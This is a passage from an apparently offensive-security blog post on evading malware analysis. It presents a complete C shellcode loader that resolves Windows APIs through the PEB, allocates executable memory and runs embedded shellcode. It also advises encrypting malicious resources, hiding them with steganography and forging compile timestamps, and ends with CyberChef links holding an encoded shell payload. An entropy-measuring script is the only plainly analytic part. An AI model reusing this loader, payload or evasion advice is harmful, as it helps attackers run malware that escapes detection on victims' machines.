  <li><code class="language-plaintext highlighter-rouge">InMemoryOrderModuleList</code> is a doubly linked list of <code class="language-plaintext highlighter-rouge">LDR_DATA_TABLE_ENTRY</code> structures, each contains <code class="language-plaintext highlighter-rouge">BaseDllName</code> and <code class="language-plaintext highlighter-rouge">DllBase</code> of a single module</li>
  <li>We can browse all loaded modules, find <code class="language-plaintext highlighter-rouge">kernel32.dll</code> and it’s base address</li>
  <li>Knowing <code class="language-plaintext highlighter-rouge">kernel32.dll</code> location in memory, we can find its export directory and browse it for <code class="language-plaintext highlighter-rouge">GetProcAddress</code> function</li>
  <li>Using <code class="language-plaintext highlighter-rouge">GetProcAddress</code> we can find other necessary functions and load all needed modules</li>
</ol>

<p>Let’s implement this procedure:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="nf">HMODULE</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">PGetModuleHandleA</span><span class="p">)(</span><span class="n">PCSTR</span><span class="p">);</span>
<span class="k">typedef</span> <span class="nf">FARPROC</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">PGetProcAddress</span><span class="p">)(</span><span class="n">HMODULE</span><span class="p">,</span> <span class="n">PCSTR</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">PVOID</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">PVirtualAlloc</span><span class="p">)(</span><span class="n">PVOID</span><span class="p">,</span> <span class="n">SIZE_T</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">);</span>
<span class="k">typedef</span> <span class="nf">PVOID</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">PCreateThread</span><span class="p">)(</span><span class="n">PSECURITY_ATTRIBUTES</span><span class="p">,</span> <span class="n">SIZE_T</span><span class="p">,</span> <span class="n">PTHREAD_START_ROUTINE</span><span class="p">,</span> <span class="n">PVOID</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">,</span> <span class="n">PDWORD</span><span class="p">);</span>
<span class="k">typedef</span> <span class="nf">PVOID</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">PWaitForSingleObject</span><span class="p">)(</span><span class="n">HANDLE</span><span class="p">,</span> <span class="n">DWORD</span><span class="p">);</span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">PPEB</span> <span class="n">pPEB</span> <span class="o">=</span> <span class="p">(</span><span class="n">PPEB</span><span class="p">)</span><span class="n">__readgsqword</span><span class="p">(</span><span class="mh">0x60</span><span class="p">);</span>
	<span class="n">PPEB_LDR_DATA</span> <span class="n">pLoaderData</span> <span class="o">=</span> <span class="n">pPEB</span><span class="o">-&gt;</span><span class="n">Ldr</span><span class="p">;</span>
	<span class="n">PLIST_ENTRY</span> <span class="n">listHead</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pLoaderData</span><span class="o">-&gt;</span><span class="n">InMemoryOrderModuleList</span><span class="p">;</span>
	<span class="n">PLIST_ENTRY</span> <span class="n">listCurrent</span> <span class="o">=</span> <span class="n">listHead</span><span class="o">-&gt;</span><span class="n">Flink</span><span class="p">;</span>
	<span class="n">PVOID</span> <span class="n">kernel32Address</span><span class="p">;</span>
	<span class="k">do</span>
	<span class="p">{</span>
		<span class="n">PLDR_DATA_TABLE_ENTRY</span> <span class="n">dllEntry</span> <span class="o">=</span> <span class="n">CONTAINING_RECORD</span><span class="p">(</span><span class="n">listCurrent</span><span class="p">,</span> <span class="n">LDR_DATA_TABLE_ENTRY</span><span class="p">,</span> <span class="n">InMemoryOrderLinks</span><span class="p">);</span>
		<span class="n">DWORD</span> <span class="n">dllNameLength</span> <span class="o">=</span> <span class="n">WideCharToMultiByte</span><span class="p">(</span><span class="n">CP_ACP</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">dllEntry</span><span class="o">-&gt;</span><span class="n">FullDllName</span><span class="p">.</span><span class="n">Buffer</span><span class="p">,</span> <span class="n">dllEntry</span><span class="o">-&gt;</span><span class="n">FullDllName</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
		<span class="n">PCHAR</span> <span class="n">dllName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">HeapAlloc</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="n">HEAP_ZERO_MEMORY</span><span class="p">,</span> <span class="n">dllNameLength</span><span class="p">);</span>
		<span class="n">WideCharToMultiByte</span><span class="p">(</span><span class="n">CP_ACP</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">dllEntry</span><span class="o">-&gt;</span><span class="n">FullDllName</span><span class="p">.</span><span class="n">Buffer</span><span class="p">,</span> <span class="n">dllEntry</span><span class="o">-&gt;</span><span class="n">FullDllName</span><span class="p">.</span><span class="n">Length</span><span class="p">,</span> <span class="n">dllName</span><span class="p">,</span> <span class="n">dllNameLength</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
		<span class="n">CharUpperA</span><span class="p">(</span><span class="n">dllName</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">dllName</span><span class="p">,</span> <span class="s">"KERNEL32.DLL"</span><span class="p">))</span>
		<span class="p">{</span>
			<span class="n">kernel32Address</span> <span class="o">=</span> <span class="n">dllEntry</span><span class="o">-&gt;</span><span class="n">DllBase</span><span class="p">;</span>
			<span class="n">HeapFree</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">dllName</span><span class="p">);</span>
			<span class="k">break</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="n">HeapFree</span><span class="p">(</span><span class="n">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">dllName</span><span class="p">);</span>
		<span class="n">listCurrent</span> <span class="o">=</span> <span class="n">listCurrent</span><span class="o">-&gt;</span><span class="n">Flink</span><span class="p">;</span>
	<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">listCurrent</span> <span class="o">!=</span> <span class="n">listHead</span><span class="p">);</span>

	<span class="n">PIMAGE_DOS_HEADER</span> <span class="n">pDosHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">kernel32Address</span><span class="p">;</span>
	<span class="n">PIMAGE_NT_HEADERS</span> <span class="n">pNtHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_NT_HEADERS</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">kernel32Address</span> <span class="o">+</span> <span class="n">pDosHeader</span><span class="o">-&gt;</span><span class="n">e_lfanew</span><span class="p">);</span>
	<span class="n">PIMAGE_OPTIONAL_HEADER</span> <span class="n">pOptionalHeader</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_OPTIONAL_HEADER</span><span class="p">)</span><span class="o">&amp;</span><span class="p">(</span><span class="n">pNtHeader</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">);</span>
	<span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="n">pExportDirectory</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_EXPORT_DIRECTORY</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">kernel32Address</span> <span class="o">+</span> <span class="n">pOptionalHeader</span><span class="o">-&gt;</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class="p">].</span><span class="n">VirtualAddress</span><span class="p">);</span>
	<span class="n">PULONG</span> <span class="n">pAddressOfFunctions</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">kernel32Address</span> <span class="o">+</span> <span class="n">pExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfFunctions</span><span class="p">);</span>
	<span class="n">PULONG</span> <span class="n">pAddressOfNames</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONG</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">kernel32Address</span> <span class="o">+</span> <span class="n">pExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNames</span><span class="p">);</span>
	<span class="n">PUSHORT</span> <span class="n">pAddressOfNameOrdinals</span> <span class="o">=</span> <span class="p">(</span><span class="n">PUSHORT</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">kernel32Address</span> <span class="o">+</span> <span class="n">pExportDirectory</span><span class="o">-&gt;</span><span class="n">AddressOfNameOrdinals</span><span class="p">);</span>

	<span class="n">PGetModuleHandleA</span> <span class="n">pGetModuleHandleA</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="n">PGetProcAddress</span> <span class="n">pGetProcAddress</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">pExportDirectory</span><span class="o">-&gt;</span><span class="n">NumberOfNames</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">PCSTR</span> <span class="n">pFunctionName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PSTR</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">kernel32Address</span> <span class="o">+</span> <span class="n">pAddressOfNames</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">pFunctionName</span><span class="p">,</span> <span class="s">"GetModuleHandleA"</span><span class="p">))</span>
		<span class="p">{</span>
			<span class="n">pGetModuleHandleA</span> <span class="o">=</span> <span class="p">(</span><span class="n">PGetModuleHandleA</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">kernel32Address</span> <span class="o">+</span> <span class="n">pAddressOfFunctions</span><span class="p">[</span><span class="n">pAddressOfNameOrdinals</span><span class="p">[</span><span class="n">i</span><span class="p">]]);</span>
		<span class="p">}</span>
		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">pFunctionName</span><span class="p">,</span> <span class="s">"GetProcAddress"</span><span class="p">))</span>
		<span class="p">{</span>
			<span class="n">pGetProcAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">PGetProcAddress</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">kernel32Address</span> <span class="o">+</span> <span class="n">pAddressOfFunctions</span><span class="p">[</span><span class="n">pAddressOfNameOrdinals</span><span class="p">[</span><span class="n">i</span><span class="p">]]);</span>
		<span class="p">}</span>
	<span class="p">}</span>

	<span class="n">HMODULE</span> <span class="n">hKernel32</span> <span class="o">=</span> <span class="n">pGetModuleHandleA</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">);</span>
	<span class="n">PVirtualAlloc</span> <span class="n">funcVirtualAlloc</span> <span class="o">=</span> <span class="p">(</span><span class="n">PVirtualAlloc</span><span class="p">)</span><span class="n">pGetProcAddress</span><span class="p">(</span><span class="n">hKernel32</span><span class="p">,</span> <span class="s">"VirtualAlloc"</span><span class="p">);</span>
	<span class="n">PCreateThread</span> <span class="n">funcCreateThread</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCreateThread</span><span class="p">)</span><span class="n">pGetProcAddress</span><span class="p">(</span><span class="n">hKernel32</span><span class="p">,</span> <span class="s">"CreateThread"</span><span class="p">);</span>
	<span class="n">PWaitForSingleObject</span> <span class="n">funcWaitForSingleObject</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWaitForSingleObject</span><span class="p">)</span><span class="n">pGetProcAddress</span><span class="p">(</span><span class="n">hKernel32</span><span class="p">,</span> <span class="s">"WaitForSingleObject"</span><span class="p">);</span>

	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\\</span><span class="s">xfc</span><span class="se">\\</span><span class="s">x48</span><span class="se">\\</span><span class="s">x83 (...) "</span><span class="p">;</span>
	<span class="n">PVOID</span> <span class="n">shellcode_exec</span> <span class="o">=</span> <span class="n">funcVirtualAlloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
	<span class="n">memcpy</span><span class="p">(</span><span class="n">shellcode_exec</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">shellcode</span><span class="p">);</span>
	<span class="n">DWORD</span> <span class="n">threadID</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">hThread</span> <span class="o">=</span> <span class="n">funcCreateThread</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">PTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcode_exec</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">threadID</span><span class="p">);</span>
	<span class="n">funcWaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span>
<span class="p">}</span>

</code></pre></div></div>

<h3 id="pe-analysis-and-indicators">PE analysis and indicators</h3>

<p>While statically examining a malicious sample, malware analysts look 
at PE file structure and contents. This data may reveal certain details 
about the application and help classify it as a malware. We talked about
 imports, now let’s focus on other PE sections, embedded resources and 
timestamps.</p>

<h4 id="sections">Sections</h4>

<p>The thing to note here is that we should ensure that section names 
reflect a legitimate, compiled PE structure. For example, packers may 
change sections names to random character strings or even obvious 
indicators of packer software (<code class="language-plaintext highlighter-rouge">UPX0</code>, <code class="language-plaintext highlighter-rouge">UPX1</code> etc.).</p>

<p>Adding a new section may also raise suspicions - it may be better idea to store data in the existing resources section.</p>

<p>Also, section raw size (size on disk) should usually be almost equal 
to virtual size (size in memory when the image is loaded) - small 
differences are common due to different memory alignments (disk vs RAM).
 For example, <code class="language-plaintext highlighter-rouge">.text</code> section with raw size of <code class="language-plaintext highlighter-rouge">0</code> and virtual size of hundreds of KBs probably means that the actual executable was packed.</p>

<h4 id="resources">Resources</h4>

<p>We can embed any data in the executable as a resource - for example 
an icon, a decoy document or a shellcode. However everything will be 
visible with <code class="language-plaintext highlighter-rouge">Resource Hacker</code>
 or any similar tool. It is a good idea to embed malicious resources 
encrypted or using steganography to make it more difficult to inspect 
them.</p>

<h4 id="timestamp">Timestamp</h4>

<p>PE header contains <code class="language-plaintext highlighter-rouge">TimeDateStamp</code>
 4-byte field which is Unix time of compilation. This can be easily 
changed (for example with hex editor) to hide the actual compilation 
date.</p>

<h3 id="entropy-analysis">Entropy analysis</h3>

<p>Entropy analysis can be used to easily find potentially encrypted 
content embedded in the executable. Encrypted data usually has 
relatively high entropy (almost 8 bits). The same applies for compressed
 data.</p>

<p>We can use this simple Python script (be sure to install <code class="language-plaintext highlighter-rouge">pefile</code> module) to calculate the entropy of PE file sections:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">math</span>
<span class="kn">import</span> <span class="nn">pefile</span>
<span class="kn">import</span> <span class="nn">peutils</span>

<span class="k">def</span> <span class="nf">Entropy</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
	<span class="n">entropy</span> <span class="o">=</span> <span class="mi">0</span>  
	<span class="k">if</span> <span class="ow">not</span> <span class="n">data</span><span class="p">:</span>
		<span class="k">return</span> <span class="mi">0</span>
	<span class="n">ent</span> <span class="o">=</span> <span class="mi">0</span>
	<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
		<span class="n">p_x</span> <span class="o">=</span> <span class="nb">float</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">count</span><span class="p">(</span><span class="n">x</span><span class="p">))</span><span class="o">/</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
		<span class="k">if</span> <span class="n">p_x</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
			<span class="n">entropy</span> <span class="o">+=</span> <span class="o">-</span> <span class="n">p_x</span><span class="o">*</span><span class="n">math</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="n">p_x</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">entropy</span>

<span class="n">pe</span><span class="o">=</span><span class="n">pefile</span><span class="p">.</span><span class="n">PE</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
<span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">pe</span><span class="p">.</span><span class="n">sections</span><span class="p">:</span>
	<span class="k">print</span> <span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">Name</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">).</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\\</span><span class="s">x00'</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\\</span><span class="s">t"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">Entropy</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">get_data</span><span class="p">())))</span>

</code></pre></div></div>

<p>Let’s start with simple shellcode loader we developed before. Here’s sections entropy:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text   4.616090501867742
.rdata  5.4577520758849944
.pdata  0.10191042566270775
.rsrc   4.7015032582517895

</code></pre></div></div>

<p>Application code located in <code class="language-plaintext highlighter-rouge">.text.</code> section has entropy comparable with human language text. Shellcode is located in <code class="language-plaintext highlighter-rouge">.rdata</code> section which has a slightly higher entropy.</p>

<p>Now let’s embed some large blob of encrypted data, for example by adding a resource to the executable. As we can see below, the <code class="language-plaintext highlighter-rouge">.rsrc</code>
 section probably contains some encrypted or compressed data. Actually, 
it could be some image or any other file format which uses compression.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.text   4.616090501867742
.rdata  5.458570681613711
.pdata  0.10191042566270775
.rsrc   7.95737230129355

</code></pre></div></div>

<p>To simply manipulate the entropy of a data block, we could use Base64 encoding. See the entropy values for
<a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('%5C%5Cx')Entropy('Shannon%20scale')&amp;input=XHhmY1x4NDhceDgzXHhlNFx4ZjBceGU4XHhjMFx4MDBceDAwXHgwMFx4NDFceDUxXHg0MVx4NTBceDUyXHg1MVx4NTZceDQ4XHgzMVx4ZDJceDY1XHg0OFx4OGJceDUyXHg2MFx4NDhceDhiXHg1Mlx4MThceDQ4XHg4Ylx4NTJceDIwXHg0OFx4OGJceDcyXHg1MFx4NDhceDBmXHhiN1x4NGFceDRhXHg0ZFx4MzFceGM5XHg0OFx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4NDFceGMxXHhjOVx4MGRceDQxXHgwMVx4YzFceGUyXHhlZFx4NTJceDQxXHg1MVx4NDhceDhiXHg1Mlx4MjBceDhiXHg0Mlx4M2NceDQ4XHgwMVx4ZDBceDhiXHg4MFx4ODhceDAwXHgwMFx4MDBceDQ4XHg4NVx4YzBceDc0XHg2N1x4NDhceDAxXHhkMFx4NTBceDhiXHg0OFx4MThceDQ0XHg4Ylx4NDBceDIwXHg0OVx4MDFceGQwXHhlM1x4NTZceDQ4XHhmZlx4YzlceDQxXHg4Ylx4MzRceDg4XHg0OFx4MDFceGQ2XHg0ZFx4MzFceGM5XHg0OFx4MzFceGMwXHhhY1x4NDFceGMxXHhjOVx4MGRceDQxXHgwMVx4YzFceDM4XHhlMFx4NzVceGYxXHg0Y1x4MDNceDRjXHgyNFx4MDhceDQ1XHgzOVx4ZDFceDc1XHhkOFx4NThceDQ0XHg4Ylx4NDBceDI0XHg0OVx4MDFceGQwXHg2Nlx4NDFceDhiXHgwY1x4NDhceDQ0XHg4Ylx4NDBceDFjXHg0OVx4MDFceGQwXHg0MVx4OGJceDA0XHg4OFx4NDhceDAxXHhkMFx4NDFceDU4XHg0MVx4NThceDVlXHg1OVx4NWFceDQxXHg1OFx4NDFceDU5XHg0MVx4NWFceDQ4XHg4M1x4ZWNceDIwXHg0MVx4NTJceGZmXHhlMFx4NThceDQxXHg1OVx4NWFceDQ4XHg4Ylx4MTJceGU5XHg1N1x4ZmZceGZmXHhmZlx4NWRceDQ5XHhiZVx4NzdceDczXHgzMlx4NWZceDMzXHgzMlx4MDBceDAwXHg0MVx4NTZceDQ5XHg4OVx4ZTZceDQ4XHg4MVx4ZWNceGEwXHgwMVx4MDBceDAwXHg0OVx4ODlceGU1XHg0OVx4YmNceDAyXHgwMFx4MTFceDVjXHgwMFx4MDBceDAwXHgwMFx4NDFceDU0XHg0OVx4ODlceGU0XHg0Y1x4ODlceGYxXHg0MVx4YmFceDRjXHg3N1x4MjZceDA3XHhmZlx4ZDVceDRjXHg4OVx4ZWFceDY4XHgwMVx4MDFceDAwXHgwMFx4NTlceDQxXHhiYVx4MjlceDgwXHg2Ylx4MDBceGZmXHhkNVx4NTBceDUwXHg0ZFx4MzFceGM5XHg0ZFx4MzFceGMwXHg0OFx4ZmZceGMwXHg0OFx4ODlceGMyXHg0OFx4ZmZceGMwXHg0OFx4ODlceGMxXHg0MVx4YmFceGVhXHgwZlx4ZGZceGUwXHhmZlx4ZDVceDQ4XHg4OVx4YzdceDZhXHgxMFx4NDFceDU4XHg0Y1x4ODlceGUyXHg0OFx4ODlceGY5XHg0MVx4YmFceGMyXHhkYlx4MzdceDY3XHhmZlx4ZDVceDQ4XHgzMVx4ZDJceDQ4XHg4OVx4ZjlceDQxXHhiYVx4YjdceGU5XHgzOFx4ZmZceGZmXHhkNVx4NGRceDMxXHhjMFx4NDhceDMxXHhkMlx4NDhceDg5XHhmOVx4NDFceGJhXHg3NFx4ZWNceDNiXHhlMVx4ZmZceGQ1XHg0OFx4ODlceGY5XHg0OFx4ODlceGM3XHg0MVx4YmFceDc1XHg2ZVx4NGRceDYxXHhmZlx4ZDVceDQ4XHg4MVx4YzRceGEwXHgwMlx4MDBceDAwXHg0OVx4YjhceDYzXHg2ZFx4NjRceDAwXHgwMFx4MDBceDAwXHgwMFx4NDFceDUwXHg0MVx4NTBceDQ4XHg4OVx4ZTJceDU3XHg1N1x4NTdceDRkXHgzMVx4YzBceDZhXHgwZFx4NTlceDQxXHg1MFx4ZTJceGZjXHg2Nlx4YzdceDQ0XHgyNFx4NTRceDAxXHgwMVx4NDhceDhkXHg0NFx4MjRceDE4XHhjNlx4MDBceDY4XHg0OFx4ODlceGU2XHg1Nlx4NTBceDQxXHg1MFx4NDFceDUwXHg0MVx4NTBceDQ5XHhmZlx4YzBceDQxXHg1MFx4NDlceGZmXHhjOFx4NGRceDg5XHhjMVx4NGNceDg5XHhjMVx4NDFceGJhXHg3OVx4Y2NceDNmXHg4Nlx4ZmZceGQ1XHg0OFx4MzFceGQyXHg0OFx4ZmZceGNhXHg4Ylx4MGVceDQxXHhiYVx4MDhceDg3XHgxZFx4NjBceGZmXHhkNVx4YmJceGYwXHhiNVx4YTJceDU2XHg0MVx4YmFceGE2XHg5NVx4YmRceDlkXHhmZlx4ZDVceDQ4XHg4M1x4YzRceDI4XHgzY1x4MDZceDdjXHgwYVx4ODBceGZiXHhlMFx4NzVceDA1XHhiYlx4NDdceDEzXHg3Mlx4NmZceDZhXHgwMFx4NTlceDQxXHg4OVx4ZGFceGZmXHhkNQ">plain shellcode</a>,
<a href="https://gchq.github.io/CyberChef/#recipe=From_Hex('%5C%5Cx')AES_Encrypt(%7B'option':'Hex','string':'42138947829316abfa38addd8239088a'%7D,%7B'option':'Hex','string':'983274bfbca8dde7938454875984aa7d'%7D,'CBC','Raw','Raw')Entropy('Shannon%20scale')&amp;input=XHhmY1x4NDhceDgzXHhlNFx4ZjBceGU4XHhjMFx4MDBceDAwXHgwMFx4NDFceDUxXHg0MVx4NTBceDUyXHg1MVx4NTZceDQ4XHgzMVx4ZDJceDY1XHg0OFx4OGJceDUyXHg2MFx4NDhceDhiXHg1Mlx4MThceDQ4XHg4Ylx4NTJceDIwXHg0OFx4OGJceDcyXHg1MFx4NDhceDBmXHhiN1x4NGFceDRhXHg0ZFx4MzFceGM5XHg0OFx4MzFceGMwXHhhY1x4M2NceDYxXHg3Y1x4MDJceDJjXHgyMFx4NDFceGMxXHhjOVx4MGRceDQxXHgwMVx4YzFceGUyXHhlZFx4NTJceDQxXHg1MVx4NDhceDhiXHg1Mlx4MjBceDhiXHg0Mlx4M2NceDQ4XHgwMVx4ZDBceDhiXHg4MFx4ODhceDAwXHgwMFx4MDBceDQ4XHg4NVx4YzBceDc0XHg2N1x4NDhceDAxXHhkMFx4NTBceDhiXHg0OFx4MThceDQ0XHg4Ylx4NDBceDIwXHg0OVx4MDFceGQwXHhlM1x4NTZceDQ4XHhmZlx4YzlceDQxXHg4Ylx4MzRceDg4XHg0OFx4MDFceGQ2XHg0ZFx4MzFceGM5XHg0OFx4MzFceGMwXHhhY1x4NDFceGMxXHhjOVx4MGRceDQxXHgwMVx4YzFceDM4XHhlMFx4NzVceGYxXHg0Y1x4MDNceDRjXHgyNFx4MDhceDQ1XHgzOVx4ZDFceDc1XHhkOFx4NThceDQ0XHg4Ylx4NDBceDI0XHg0OVx4MDFceGQwXHg2Nlx4NDFceDhiXHgwY1x4NDhceDQ0XHg4Ylx4NDBceDFjXHg0OVx4MDFceGQwXHg0MVx4OGJceDA0XHg4OFx4NDhceDAxXHhkMFx4NDFceDU4XHg0MVx4NThceDVlXHg1OVx4NWFceDQxXHg1OFx4NDFceDU5XHg0MVx4NWFceDQ4XHg4M1x4ZWNceDIwXHg0MVx4NTJceGZmXHhlMFx4NThceDQxXHg1OVx4NWFceDQ4XHg4Ylx4MTJceGU5XHg1N1x4ZmZceGZmXHhmZlx4NWRceDQ5XHhiZVx4NzdceDczXHgzMlx4NWZceDMzXHgzMlx4MDBceDAwXHg0MVx4NTZceDQ5XHg4OVx4ZTZceDQ4XHg4MVx4ZWNceGEwXHgwMVx4MDBceDAwXHg0OVx4ODlceGU1XHg0OVx4YmNceDAyXHgwMFx4MTFceDVjXHgwMFx4MDBceDAwXHgwMFx4NDFceDU0XHg0OVx4ODlceGU0XHg0Y1x4ODlceGYxXHg0MVx4YmFceDRjXHg3N1x4MjZceDA3XHhmZlx4ZDVceDRjXHg4OVx4ZWFceDY4XHgwMVx4MDFceDAwXHgwMFx4NTlceDQxXHhiYVx4MjlceDgwXHg2Ylx4MDBceGZmXHhkNVx4NTBceDUwXHg0ZFx4MzFceGM5XHg0ZFx4MzFceGMwXHg0OFx4ZmZceGMwXHg0OFx4ODlceGMyXHg0OFx4ZmZceGMwXHg0OFx4ODlceGMxXHg0MVx4YmFceGVhXHgwZlx4ZGZceGUwXHhmZlx4ZDVceDQ4XHg4OVx4YzdceDZhXHgxMFx4NDFceDU4XHg0Y1x4ODlceGUyXHg0OFx4ODlceGY5XHg0MVx4YmFceGMyXHhkYlx4MzdceDY3XHhmZlx4ZDVceDQ4XHgzMVx4ZDJceDQ4XHg4OVx4ZjlceDQxXHhiYVx4YjdceGU5XHgzOFx4ZmZceGZmXHhkNVx4NGRceDMxXHhjMFx4NDhceDMxXHhkMlx4NDhceDg5XHhmOVx4NDFceGJhXHg3NFx4ZWNceDNiXHhlMVx4ZmZceGQ1XHg0OFx4ODlceGY5XHg0OFx4ODlceGM3XHg0MVx4YmFceDc1XHg2ZVx4NGRceDYxXHhmZlx4ZDVceDQ4XHg4MVx4YzRceGEwXHgwMlx4MDBceDAwXHg0OVx4YjhceDYzXHg2ZFx4NjRceDAwXHgwMFx4MDBceDAwXHgwMFx4NDFceDUwXHg0MVx4NTBceDQ4XHg4OVx4ZTJceDU3XHg1N1x4NTdceDRkXHgzMVx4YzBceDZhXHgwZFx4NTlceDQxXHg1MFx4ZTJceGZjXHg2Nlx4YzdceDQ0XHgyNFx4NTRceDAxXHgwMVx4NDhceDhkXHg0NFx4MjRceDE4XHhjNlx4MDBceDY4XHg0OFx4ODlceGU2XHg1Nlx4NTBceDQxXHg1MFx4NDFceDUwXHg0MVx4NTBceDQ5XHhmZlx4YzBceDQxXHg1MFx4NDlceGZmXHhjOFx4NGRceDg5XHhjMVx4NGNceDg5XHhjMVx4NDFceGJhXHg3OVx4Y2NceDNmXHg4Nlx4ZmZceGQ1XHg0OFx4MzFceGQyXHg0OFx4ZmZceGNhXHg4Ylx4MGVceDQxXHhiYVx4MDhceDg3XHgxZFx4NjBceGZmXHhkNVx4YmJceGYwXHhiNVx4YTJceDU2XH